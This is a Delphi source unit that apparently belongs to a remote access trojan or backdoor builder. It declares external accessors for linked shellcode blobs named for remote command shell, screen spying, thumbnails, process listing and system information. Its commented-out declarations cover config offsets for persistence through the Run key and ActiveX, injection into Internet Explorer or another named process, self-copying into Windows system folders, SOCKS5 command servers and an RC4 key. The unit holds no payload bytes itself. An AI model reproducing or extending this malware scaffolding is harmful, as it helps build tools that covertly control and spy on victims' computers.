unit UnitShellCodes;

interface
uses
  Winapi.Windows;

const
  CONNECT_METHOD_DIRECT = 0;
  CONNECT_METHOD_SOCKS5 = 1;

  STARTUP_METHOD_NONE = 0;
  STARTUP_METHOD_CURRENT_RUN = 1;
  STARTUP_METHOD_ACTIVEX = 2;

  COPY_METHOD_NONE = 0;
  COPY_METHOD_TO_WINDOWS = 1;
  COPY_METHOD_TO_SYSTEM = 2;

// config
{function get_id_offset(): DWORD; external;
function get_mutex_name_offset(): DWORD; external;
function get_startup_name_offset(): DWORD; external;
function get_connect_method_offset(): DWORD; external;
function get_startup_method_offset(): DWORD; external;
function get_inject_to_ie_offset(): DWORD; external;
function get_inject_to_process_offset(): DWORD; external;
function get_inject_process_name_offset(): DWORD; external;
function get_server_list_offset(): DWORD; external;
function get_socks5_server_offset(): DWORD; external;
function get_socks5_port_offset(): DWORD; external;
function get_socks5_username_offset(): DWORD; external;
function get_socks5_password_offset(): DWORD; external;
function get_rc4_key_offset(): DWORD; external;
function get_copy_method_offset(): DWORD; external;
function get_copy_to_offset(): DWORD; external;
}
// shellcodes
{function get_loader_main_ptr(): Pointer; external;
function get_connect_server_by_socks5_ptr(): Pointer; external;
function get_startup_activex_ptr(): Pointer; external;
function get_startup_current_run_ptr(): Pointer; external;
function get_find_process_by_name_ptr(): Pointer; external;
function get_create_ie_process_ptr(): Pointer; external;
function get_injecter_ptr(): Pointer; external;
function get_copy_self_ptr(): DWORD; external;
}
function get_cmd_shell_ptr(): Pointer; external;
function get_information_ptr(): Pointer; external;
function get_main_ptr(): Pointer; external;
function get_process_ptr(): Pointer; external;
function get_screenspy_ptr(): Pointer; external;
function get_thumbnail_ptr(): Pointer; external;
{
function get_loader_main_size(): DWORD; external;
function get_connect_server_by_socks5_size(): DWORD; external;
function get_startup_activex_size(): DWORD; external;
function get_startup_current_run_size(): DWORD; external;
function get_find_process_by_name_size(): DWORD; external;
function get_create_ie_process_size(): DWORD; external;
function get_injecter_size(): DWORD; external;
function get_copy_self_size(): DWORD; external;
}
function get_cmd_shell_size(): DWORD; external;
function get_information_size(): DWORD; external;
function get_main_size(): DWORD; external;
function get_process_size(): DWORD; external;
function get_screenspy_size(): DWORD; external;
function get_thumbnail_size(): DWORD; external;

implementation
{$L 'shellcodes.obj'}

end.
